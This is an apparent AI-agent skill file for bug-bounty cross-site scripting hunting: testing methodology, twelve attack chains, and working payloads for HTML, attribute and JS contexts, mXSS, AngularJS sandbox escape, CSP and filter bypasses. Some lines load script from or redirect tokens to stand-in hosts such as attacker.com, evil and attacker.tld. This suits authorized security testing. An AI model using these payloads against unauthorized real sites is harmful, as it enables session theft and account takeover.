---
name: xss
description: "Use when the user is testing for cross-site scripting (reflected, stored, DOM-based), CSP bypass, sink analysis, mXSS, AngularJS sandbox escape, or any client-side JS injection — including DOM clobbering, client-side prototype pollution, DOM open redirect, and client-side template injection (AngularJS / Vue / React)."
---

# /xss - Cross-Site Scripting Hunting

You are assisting **Liodeus (YesWeHack)**, whose XSS reports span DOM-based postMessage sinks, stored XSS via SVG uploads, mXSS through HTML sanitizer round-trips, and AngularJS template injection on legacy pages. **Reflected XSS without auth or with same-origin impact is the floor; stored XSS with admin-context impact is the ceiling.**

## Core Philosophy

XSS is a sink hunt, not a payload hunt. Don't spray `<script>alert(1)</script>` everywhere — find the sink (where data ends up), then craft the payload that fits the context. Three contexts cover 95% of cases:
1. **HTML body** — break tags, inject new tags
2. **Attribute** — break out of attribute, add event handler
3. **JS context** — break out of string, statement-inject

For DOM XSS: it's all about source → sink. Find the source (`location`, `postMessage`, `cookie`, `localStorage`), trace it to a dangerous sink (`innerHTML`, `eval`, `document.write`, `setAttribute('on*', ...)`).

## DOM vulnerability family

DOM-based vulns run entirely in the victim's JS engine — the **server never processes the
payload** (URL fragments after `#`, `window.name`, and `postMessage` are invisible to it). A
clean path must be traced from a **Source** to a vulnerable **Sink**.

| Vulnerability | Criticality | Impact |
|---|---|---|
| DOM XSS | **Critical** | session hijack, ATO, real-time PII exfil, client-side request forgery |
| Web Message (`postMessage`) | **High** | same-origin-policy breach; data theft between tabs/iframes; usually escalates to global DOM XSS |
| DOM Open Redirect | **Medium/High** | credible phishing off the legit domain; **primary vector for stealing OAuth authorization codes / access tokens** |

**Sources** (attacker-reachable entry points): `document.URL/documentURI/URLUnencoded/baseURI`,
`location.{search,hash,pathname,href}`, `document.cookie`, `window.name`, `local/sessionStorage`,
`document.referrer`, `history.{pushState,replaceState}`, `IndexedDB`. Two cross-flow shapes:
*reflected/stored data re-read insecurely by client JS* (e.g. a hidden input read into
`innerHTML`), and *cross-origin web messages* where `event.origin` isn't strictly validated.

**Sinks** ship in [`recon/dom-sinks.txt`](../recon/dom-sinks.txt) (HTML injection, code
execution, navigation/URL, jQuery, framework sanitizer bypass, source markers, postMessage).
Advanced DOM families each get a companion doc — [dom-clobbering](dom-clobbering.md),
[prototype-pollution](prototype-pollution.md), [dom-open-redirect](dom-open-redirect.md),
[csti](csti.md) — plus the live [`playwright-dom-debugging`](playwright-dom-debugging.md)
harness for confirming any flow headless.

## XSS Chains (from real reports)

### Chain 1: Reflected XSS → ATO via cookie / token theft
1. Reflected XSS in a logged-in context (or chainable to one)
2. Payload reads `document.cookie` (if not HttpOnly) or calls `/api/me` and exfils to attacker
3. Combine with no-CSRF endpoint to perform actions in victim's context

### Chain 2: Stored XSS in admin panel
1. Plant payload in a field rendered to admins (similar to bXSS but with direct rendering)
2. Admin views user list / ticket / log → payload fires
3. Steal admin session / inject into admin's view of other users → mass impact

### Chain 3: DOM XSS via postMessage
1. Find a `window.addEventListener('message', e => ...)` that doesn't check `e.origin`
2. Or checks `e.origin.indexOf('target.com') !== -1` (matches `target.com.evil.com`)
3. Iframe the target from your domain, postMessage payload, sink fires
4. Common sinks: `eval(e.data)`, `innerHTML = e.data`, `location = e.data.url`

### Chain 4: SVG upload → stored XSS
1. App accepts SVG as profile pic / image
2. SVG contains `<script>` or `<foreignObject>` with HTML
3. Served from same origin (not via image CDN with restrictive CSP) → script executes
4. If served from a separate cookieless origin, less impact — but still XSS

### Chain 5: mXSS through sanitizer round-trip
1. App sanitizes input with library X, then a different layer reparses (e.g. into DocumentFragment, Markdown→HTML, etc.)
2. Sanitizer-safe input mutates into XSS-bearing HTML on reparse
3. Classic: `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` mutates differently in HTML5 parser
4. mXSS cheatsheet: Cure53 mXSS PoCs, DOMPurify bypasses

### Chain 6: AngularJS sandbox escape
1. Legacy page using AngularJS 1.x with user-controlled data in a binding context
2. Payload like `{{constructor.constructor('alert(1)')()}}` — varies by AngularJS version
3. Often hides in CMS / template-rendered content / error messages

### Chain 7: Markdown / WYSIWYG bypasses
1. Rich text editors that allow HTML (Quill, TinyMCE, ProseMirror)
2. Markdown renderers that allow inline HTML
3. Image alt-text injection: `![](x" onerror="alert(1)//)`
4. Link injection: `[click](javascript:alert(1))`

### Chain 8: CSP bypass
* `unsafe-inline` — game over
* `script-src 'self'` + JSONP endpoint on same origin → bypass via JSONP callback
* `script-src https://cdn.jsdelivr.net` → load any package as a module
* `script-src 'nonce-XYZ'` → if nonce leaks in another vuln, reuse
* `script-src 'strict-dynamic'` → dangling markup attacks via legitimate scripts that load more
* Base-URI not set → `<base href="//attacker.com/">` redirects relative scripts
* `default-src 'none'` but `style-src 'unsafe-inline'` → CSS exfil tricks

### Chain 9: DOM Clobbering
1. HTML-injection foothold that CSP/sanitizer blocks from full XSS (comment, rich-text, page param)
2. App reads a global you can shadow, e.g. `window.config?.apiBase || "/api/v1/user"` → `script.src`
3. Inject `<a id="config" name="apiBase" href="https://evil/x.js">` → `window.config.apiBase` returns the `<a>`'s `href`
4. **High-value variant:** clobber a config the page passes to a CSP-allow-listed JSONP/CDN endpoint → execution under the trusted origin = CSP bypass. → [dom-clobbering.md](dom-clobbering.md)

### Chain 10: Client-Side Prototype Pollution
1. Insecure recursive parser (deparam / `$.extend(true,…)` / `_.merge`) writes to `__proto__` or `constructor.prototype`
2. Pollute `Object.prototype` via `?__proto__[x]=y` (or `?constructor[prototype][x]=y` to dodge `__proto__` filters)
3. A latent sink reads a property that normally doesn't exist → inherits your payload, e.g. `cfg.sourceURL || "/js/default.js"` fed to `eval`/`Function`. → [prototype-pollution.md](prototype-pollution.md)

### Chain 11: DOM Open Redirect → OAuth token theft
1. Client script feeds an attacker URL into a navigation sink: `location = param`, `window.open(param)`, `location.replace(param)`
2. Param names: `redirect`/`redirect_uri`, `next`, `url`, `returnUrl`, `continue`, `r` — often read by JS only (server never sees it)
3. Beat a weak domain check: `https://victim.tld@attacker.tld` (user-info `@`), `victim.tld.attacker.tld` (fake subdomain), `//attacker.tld` (protocol-relative), `victim.tld\/@attacker.tld` (backslash parser-confusion)
4. Land the OAuth `code`/`access_token` (often in the fragment) on your host → ATO. Confirm the ATO leg in `/ato`. → [dom-open-redirect.md](dom-open-redirect.md)

### Chain 12: CSTI in modern frameworks
1. User data lands inside a framework-managed binding, not a plain HTML sink — payload is expression syntax (`{{ }}`), evading `<script>`-string WAFs
2. **AngularJS 1.x:** `{{constructor.constructor('pro\x6dpt(1)')()}}` (sandbox escape, version-tuned)
3. **Vue:** `{{ }}` in a client-compiled template (Vue 2 gadgets; Vue 3 via `compile()`/dynamic templates); `v-html` is a separate raw-HTML sink
4. **React:** no CSTI (auto-escapes) — hunt `dangerouslySetInnerHTML` + `href`/`src` instead. → [csti.md](csti.md)

## Discovery Methodology

### Step 1: Reflected — input mapping
* Every parameter in URL, body, headers
* Submit a unique marker per input: `xss12345`, `xss12346`, ...
* Crawl/spider the app, then `ugrep` all responses (HTML, JSON, JS) for each marker
* For each reflection: HTML body, attribute, JS string, JSON value (does it get rendered into HTML?), CSS, URL

### Step 2: Context analysis
For each reflection, look at the surrounding bytes:
* `<div>MARKER</div>` → HTML body context, `<svg onload=...>` works
* `<input value="MARKER">` → attribute, break with `"` or single quote
* `<script>var x = "MARKER";</script>` → JS string, break with `"` or `';alert(1);//`
* `<a href="MARKER">` → URL context, try `javascript:alert(1)`
* JSON in `<script>` → check if quotes are escaped, try `</script><svg onload=alert(1)>`

### Step 3: Filter probing
Once you've found a reflection, probe what's filtered:
1. Try `<a>` (lowercase) — passes? → tag whitelist might allow it
2. Try `<script>` — passes? → likely no filter
3. Try `<svg>`, `<img>`, `<iframe>` — which survive?
4. Try event handlers: `onerror`, `onload`, `onclick`, `onfocus`, exotic ones (`onbeforetoggle`, `onpointerrawupdate`)
5. Try encoding: HTML entities, URL-encoding, double-encoding, Unicode (`<`)
6. Check for case-sensitivity, length cap, null-byte truncation

### Step 4: DOM XSS
* Pull every JS file (or reuse `/recon`'s saved `js/` tree)
* `ugrep` for sinks: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout` with string, `Function(`, `setAttribute('on...`)`, `location =`, `srcdoc =`
* `ugrep` for sources: `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`, `localStorage`, `document.cookie`, `URLSearchParams`
* For each sink, trace backward — does data flow from a source to here without sanitization?
* Tooling: `ugrep -f .claude/skills/recon/dom-sinks.txt js/` for sinks/sources (ships with `/recon`); for `postMessage` specifically run `/recon` step H — `postmessage-handlers.txt` + sender-wildcard-leak + origin-check triage. Then the headless DOM debugger below; manual code review

**Static `ugrep` gets you candidates; the live browser confirms the flow.** When you have a
JS-rendered page, `postMessage`/`addEventListener('message')` handlers, or want to *prove* a
source reaches a sink, drive **headless Playwright** (CLAUDE.md Mode 3) and read
**[`playwright-dom-debugging.md`](playwright-dom-debugging.md)** — copy-paste `browser_evaluate`
snippets that hook sinks (with stack traces), wiretap + fuzz `postMessage`, do live
source→sink taint tracing, and capture CSP violations. Use it the moment `ugrep` finds a sink
or a message handler and you can't tell from the HTTP response whether the flow is real.

**Complementary surface-mapping for the DOM families:**
* **Semgrep** — community JS rules over the saved `js/` tree catch sink/source patterns `ugrep`
  regexes miss (data-flow-aware). A complement to `ugrep`, not a replacement: `semgrep --config=p/javascript --json js/`.
* **DOM Invader** (Burp browser) — interactive source/sink + `postMessage` canary tracing. GUI
  tool; the headless Playwright harness above is this repo's automated equivalent when you're
  without Burp.
* **Console `postMessage` triage** — paste once to log every message and its origin before you
  commit to the full wiretap:
  ```js
  window.addEventListener("message", e => console.log("Origin:", e.origin, "Data:", e.data), true);
  ```
* **Advanced families** — when `ugrep` surfaces the shape, drop into the matching doc:
  global-property reads + HTML-injection foothold → [dom-clobbering.md](dom-clobbering.md);
  insecure merge/deparam → [prototype-pollution.md](prototype-pollution.md);
  `location`/`window.open` from a param → [dom-open-redirect.md](dom-open-redirect.md);
  framework binding context → [csti.md](csti.md).

### Step 5: Stored
* Every persistence boundary: profile, posts, comments, tickets, files, custom fields
* For each, plant a unique payload. Visit the rendering page as victim role (or yourself).
* Don't forget ALT contexts: emails sent by the system (preview rendered in webmail), exports (PDF, CSV opened in Excel — formula injection is adjacent), API responses rendered by 3rd-party tools

## Impact Demonstration

* PoC URL or steps that fire the alert in a fresh session
* For stored: reproduce on a fresh victim account
* Show what's exfiltrable: cookie, CSRF token, account data, ability to act on victim's behalf
* If CSP is in play, show the bypass (or note the CSP's effective protection level)
* Specify: same-origin or sandboxed? With or without auth?

**Proving execution when `alert`/`eval` are filtered.** A WAF or CSP may block the literal
`alert(` signature; prove execution another way. Less-signed alternatives: `print()`,
`` prompt`1` ``, `confirm(document.domain)`. Signature-avoiding: `window['al'+'ert'](1)`,
`[].constructor.constructor("pro"+"mpt(1)")()`. **Headless caveat:** a native `alert()` dialog
is auto-dismissed and won't paint in a screenshot — prove execution with a *visible DOM effect*
(`document.title='XSS-<marker>'`, a page marker, a `console.log`, or a `fetch()` to your
HTTPWorkbench instance) per [`playwright-dom-debugging.md`](playwright-dom-debugging.md). The
full filter-evasion corpus lives in `/waf-bypass`.

## Key Considerations

* `alert(1)` is fine for triage but explain real impact in the report (cookie theft, ATO, action-on-behalf)
* Reflected XSS in 2026 is mostly informative unless: chainable to ATO, hits a high-value page (login, payment), or unauth on production
* Stored XSS in admin panel is almost always P1
* Self-XSS only counts if you can chain it (open redirect, file upload, login CSRF)
* `<script>` is rarely the right answer — `<svg onload>`, `<img onerror>`, attribute injection, `javascript:` URI all bypass naive filters
* Always check: does the page have `Content-Type: text/html`? If `application/json` or `text/plain`, no XSS regardless of reflection
* Trailing slash, file extension, charset header all change rendering — test the actual page, not a curl
